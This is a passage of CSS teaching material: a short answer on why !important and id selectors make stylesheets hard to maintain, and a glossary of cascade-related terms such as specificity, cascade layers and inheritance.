<QA q="Why should you avoid !important and id selectors for styling?">
They raise priority so much that later changes need equally strong or stronger declarations, which leads to escalating specificity and stylesheets that are hard to maintain. Keeping selectors to single classes, using a naming convention or scoped styles, and organising priority with cascade layers keeps the cascade predictable.
</QA>

## Key terms

<Terms>
  <Term name="Selector">Pattern that chooses which elements a rule applies to.</Term>
  <Term name="Declaration">A property and value pair.</Term>

  <Term name="Pseudo-class">Selector for a state or position, with one colon.</Term>
  <Term name="Pseudo-element">Selector for part of an element, with two colons.</Term>
  <Term name="Cascade">Algorithm deciding which declaration wins.</Term>
  <Term name="Specificity">Score of ids, classes and elements in a selector.</Term>
  <Term name="Cascade layer">Named group of styles with explicit priority order.</Term>
  <Term name="!important">Flag giving a declaration higher priority.</Term>
  <Term name="Inheritance">Children taking parents' values for some properties.</Term>
  <Term name="Computed value">Final value after the cascade and inheritance.</Term>
